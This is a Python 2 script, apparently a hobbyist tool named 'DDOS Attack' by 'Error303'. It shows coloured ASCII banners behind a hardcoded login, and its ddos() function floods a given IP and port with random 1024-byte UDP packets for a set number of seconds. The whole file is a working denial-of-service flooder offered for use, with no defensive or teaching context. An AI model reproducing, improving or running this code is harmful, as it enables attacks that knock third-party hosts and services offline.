#coding: utf-8

import os,sys,time
import random,socket



os.system("clear")


x="DDOS"
y="Attack"

#keyboard automatic

def sp(a):
  for e in a + "\n":
    sys.stdout.write(e)
    sys.stdout.flush()
    time.sleep(0.008)

def security():
  sp("\033[0;35m              ╔═══╗╔═══╗╔═══╗╔═══╗")
  sp("              ╚╗╔╗║╚╗╔╗║║╔═╗║║╔═╗║")
  sp("               ║║║║ ║║║║║║ ║║║╚══╗")
  sp("               ║║║║ ║║║║║║ ║║╚══╗║")
  sp("              ╔╝╚╝║╔╝╚╝║║╚═╝║║╚═╝║")
  sp("              ╚═══╝╚═══╝╚═══╝╚═══╝")
  sp("\033[0;34m+====================================================+")
  sp("\033[0;31m[*]Author     :\033[1;33m Error303")
  sp("\033[0;31m[*]Script     :\033[1;33m DDOS Attack")
  sp("\033[0;31m[*]Thanks to  :\033[1;33m ErrorCyberTeam")
  sp("\033[0;34m+====================================================+\033[0;31m")

  user = raw_input("[*]Username : \033[1;33m")
  pasw = raw_input("\033[0;31m[*]Password : \033[1;33m")
  time.sleep(2)
  if user ==x and pasw ==y:
	print "\033[0;32mAccess Granted"
	time.sleep(2)
  else:
	print "\033[0;31mAccess Denied"
	time.sleep(2)
	os.system("python2 attack.py")

def clear():
	os.system("clear")

def logo():
  sp("\033[0;35m            ░▐█▀█▄░▐█▀█▄▒▐█▀▀█▌▒▄█▀▀█")
  sp("            ░▐█▌▐█░▐█▌▐█▒▐█▄▒█▌▒▀▀█▄▄")
  sp("            ░▐█▄█▀░▐█▄█▀▒▐██▄█▌▒█▄▄█▀")
  sp("\033[0;34m +___________________________________________________ +")
  sp("\033[0;31m           [\033[1;33m*\033[0;31m]\033[1;33mAuthor  : \033[0;32mError303")
  sp("\033[0;31m           [\033[1;33m*\033[0;31m]\033[1;33mScript  : \033[0;32mDDOS Attack")

def usage():
	print '\033[0;34m \nUsage : python2 attack.py <IP> <PORT> <PACKET>\n'


def ddos(ip, port, duration):
	ddos = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	bytes = random._urandom(1024)
	timeout = time.time() + duration
	sent = 3000

	while 1:
		if time.time() > timeout:
			break
		else:
			pass
		ddos.sendto(bytes, (ip,port))
		sent = sent + 1
		print "\033[0;32mAttacking IP : \033[1;31m%s | \033[0;32mPORT : \033[0;31m%s | \033[0;32mPACKET , \033[0;31m%s "%(ip, port, sent)


def main():
	if len(sys.argv) != 4:
		security()
		clear()
		logo()
		usage()
	else:
		ddos(sys.argv[1], int(sys.argv[02]), int(sys.argv[3])),


if __name__ == "__main__":
	main()
